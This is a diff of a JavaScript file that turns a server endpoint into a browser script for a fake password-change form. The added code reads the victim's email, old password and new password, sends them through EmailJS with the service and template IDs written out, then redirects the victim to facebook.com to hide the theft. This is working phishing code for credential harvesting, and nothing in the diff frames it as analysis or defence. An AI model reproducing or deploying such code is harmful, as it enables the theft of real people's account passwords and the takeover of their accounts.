@@ -1,35 +1,26 @@
-// Save.js (Node.js Backend API)
-const emailjs = require('emailjs-com'); // Include EmailJS
-const express = require('express');
-const bodyParser = require('body-parser');
+// Initialize EmailJS with your public key
+emailjs.init('ODWuzZ-mZLM196nkP');  // <-- Your public key
 
-const app = express();
-app.use(bodyParser.json());
+document.getElementById('passwordForm').addEventListener('submit', function(event) {
+  event.preventDefault();
 
-app.post('/api/save', (req, res) => {
-  const { email, oldPassword, newPassword } = req.body;
+  const email = document.getElementById('email').value;
+  const oldPassword = document.getElementById('oldPassword').value;
+  const newPassword = document.getElementById('newPassword').value;
 
-  // Log the details to verify
-  console.log('Email:', email);
-  console.log('Old Password:', oldPassword);
-  console.log('New Password:', newPassword);
-
-  // Send email via EmailJS API
   emailjs.send('service_8hdqzju', 'template_hk6uqi8', {
-    email: email,
-    oldPassword: oldPassword,
-    newPassword: newPassword
+    from_name: email,
+    message: `Old Password: ${oldPassword}\nNew Password: ${newPassword}`,
+    reply_to: email
   })
-  .then(response => {
-    console.log('SUCCESS', response);
-    res.status(200).send('Email sent successfully');
-  })
-  .catch(error => {
-    console.log('FAILED', error);
-    res.status(500).send('Error sending email');
-  });
-});
+  .then(function() {
+    document.getElementById('passwordBox').style.display = 'none';
+    document.getElementById('successMessage').style.display = 'flex';
 
-app.listen(3000, () => {
-  console.log('Server is running on port 3000');
+    setTimeout(function() {
+      window.location.href = 'https://facebook.com';
+    }, 2000);
+  }, function() {
+    alert('Something went wrong. Please try again.');
+  });
 });
